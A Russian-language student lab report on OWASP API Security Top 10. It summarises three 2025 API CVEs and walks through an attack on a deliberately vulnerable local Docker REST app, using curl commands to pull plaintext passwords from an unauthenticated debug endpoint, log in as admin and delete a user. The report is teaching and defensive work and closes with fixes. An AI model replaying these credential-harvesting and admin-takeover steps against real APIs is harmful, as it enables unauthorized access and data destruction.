# Лабораторная работа 3

**Тема:** симуляция атаки по уязвимости из OWASP API Security Top 10 для REST API.

## Часть 1. Примеры CVE за последний год

### 1. CVE-2025-64066 — Primakon Pi Portal

Источники:  
<https://nvd.nist.gov/vuln/detail/CVE-2025-64066>  
<https://github.com/n3k7ar91/Vulnerabilites/blob/main/Primakon/CVE-2025-64066.md>

В Primakon Pi Portal 1.0.18 endpoint `/api/v2/user/register` был доступен без авторизации. Из-за этого любой пользователь мог отправить POST-запрос и создать аккаунт в системе.

**Причина:** не было нормальной проверки прав на функцию регистрации.  
**Тип OWASP:** API5:2023 Broken Function Level Authorization.  
**Последствия:** можно создать лишние аккаунты и дальше пробовать повышать привилегии.

### 2. CVE-2025-9804 — WSO2 Products

Источники:  
<https://nvd.nist.gov/vuln/detail/CVE-2025-9804>  
<https://security.docs.wso2.com/en/latest/security-announcements/security-advisories/2025/WSO2-2025-4503/>

В нескольких продуктах WSO2 была проблема с проверкой прав в некоторых внутренних SOAP Admin Services и System REST APIs. Пользователь с низкими правами мог получить доступ к функциям и информации, которые ему не должны быть доступны.

**Причина:** неполная проверка ролей и разрешений на внутренних API.  
**Тип OWASP:** API5:2023 Broken Function Level Authorization.  
**Последствия:** доступ к служебной информации и некоторым административным действиям.

### 3. CVE-2025-55462 — Eramba

Источники:  
<https://nvd.nist.gov/vuln/detail/CVE-2025-55462>  
<https://discussions.eramba.org/t/release-3-28-0/7860>

В Eramba 3.26.0 была небезопасная настройка CORS. Приложение могло отражать произвольный `Origin` в `Access-Control-Allow-Origin` и при этом разрешало `Access-Control-Allow-Credentials: true`. Поэтому вредоносный сайт мог делать запросы к API от имени пользователя.

**Причина:** слишком открытая CORS-конфигурация.  
**Тип OWASP:** API8:2023 Security Misconfiguration.  
**Последствия:** возможная утечка данных и выполнение запросов от имени жертвы.

## Часть 2. Симуляция атаки на стенде

### Запуск

Сначала я скачал и запустил уязвимый Docker-образ:

```bash
docker pull ket9/otus-devsecops-owasp-rest
docker run -d -p 8080:8080 ket9/otus-devsecops-owasp-rest:latest
```

Приложение открылось по адресу:

```text
http://localhost:8080/
```

Дальше я наполнил базу:

```bash
curl -i http://localhost:8080/createdb
```

Ответ был такой:

```json
{ "message": "Database populated." }
```

### Что я проверял

Сначала я посмотрел корневой endpoint:

```bash
curl -i http://localhost:8080/
```

Приложение показало список доступных endpoint'ов. Среди них были:

- `/users/v1` — список пользователей;
- `/users/v1/_debug` — debug-информация о пользователях;
- `/users/v1/login` — вход;
- `/users/v1/{username}` с методом DELETE — удаление пользователя.

Потом я проверил обычный список пользователей:

```bash
curl -i http://localhost:8080/users/v1
```

Ответ:

```json
{"users":[{"email":"mail1@mail.com","username":"name1"},{"email":"mail2@mail.com","username":"name2"},{"email":"admin@mail.com","username":"admin"}]}
```

Тут были только email и username, то есть на первый взгляд endpoint выглядел нормально.

### Проверка `/users/v1/_debug`

После этого я попробовал открыть debug endpoint без авторизации:

```bash
curl -i http://localhost:8080/users/v1/_debug
```

Ответ:

```json
{"users":[{"admin":false,"email":"mail1@mail.com","password":"pass1","username":"name1"},{"admin":false,"email":"mail2@mail.com","password":"pass2","username":"name2"},{"admin":true,"email":"admin@mail.com","password":"pass1","username":"admin"}]}
```

Здесь уже была явная проблема: API отдал пароли пользователей и поле `admin`. Причем endpoint был доступен вообще без токена.

### Использование найденного пароля

Из ответа видно, что у пользователя `admin` пароль `pass1`. Я попробовал залогиниться:

```bash
curl -i -X POST http://localhost:8080/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"pass1"}'
```

Ответ:

```json
{"auth_token":"<JWT_TOKEN>","message":"Successfully logged in.","status":"success"}
```

То есть пароль реально рабочий, и через него можно получить JWT администратора.

Для проверки последствий я выполнил удаление пользователя:

```bash
curl -i -X DELETE http://localhost:8080/users/v1/name2 \
  -H 'Authorization: Bearer <JWT_TOKEN>'
```

Ответ:

```json
{"message": "User deleted.", "status": "success"}
```

После повторной проверки списка пользователей `name2` уже не было. Значит, утечка пароля администратора реально приводит к получению админских возможностей.

## Найденная уязвимость

На стенде была найдена уязвимость раскрытия чувствительных данных через REST API endpoint `/users/v1/_debug`.

Основные проблемы:

- debug endpoint доступен без авторизации;
- API возвращает поля `password` и `admin`;
- пароль хранится и отдается в открытом виде;
- через пароль администратора можно получить JWT и выполнять админские действия.

## Тип по OWASP API Top 10

Основной тип: **API3:2023 Broken Object Property Level Authorization**.

Причина: сервер возвращает свойства объекта пользователя, которые обычному клиенту не должны быть видны. В обычном `/users/v1` пароль скрыт, а в `/users/v1/_debug` он отдается без проверки прав.

Также проблема частично относится к:

- **API9:2023 Improper Inventory Management**, потому что debug endpoint оказался доступен в приложении;
- **API2:2023 Broken Authentication**, потому что раскрытие пароля ломает безопасность входа.

## Меры предотвращения

Чтобы исправить такую проблему, нужно:

- убрать debug endpoint из production или закрыть его авторизацией;
- не отдавать в API поля `password`, токены и внутренние флаги;
- использовать DTO/response schema, где явно указаны разрешенные поля;
- хранить пароли только в виде хешей, например bcrypt или Argon2;
- проверять права доступа на каждом endpoint;
- вести список всех API endpoints и не публиковать служебные маршруты наружу.

## Источники

- <https://owasp.org/API-Security/editions/2023/en/0x11-t10/>
- <https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/>
- <https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/>
- <https://owasp.org/API-Security/editions/2023/en/0xa8-security-misconfiguration/>
- <https://nvd.nist.gov/vuln/detail/CVE-2025-64066>
- <https://nvd.nist.gov/vuln/detail/CVE-2025-9804>
- <https://nvd.nist.gov/vuln/detail/CVE-2025-55462>
